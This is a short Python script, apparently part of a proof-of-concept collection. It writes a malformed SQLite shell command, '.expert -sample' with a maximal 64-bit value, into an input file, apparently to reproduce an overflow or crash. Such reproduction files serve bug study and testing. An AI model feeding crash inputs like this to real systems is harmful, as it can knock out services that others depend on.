import os
input_data = ".expert -sample 9223372036854775807KiB\n"
with open("poc/sqlite/1/temppoc/input.txt", "w") as f:
    f.write(input_data)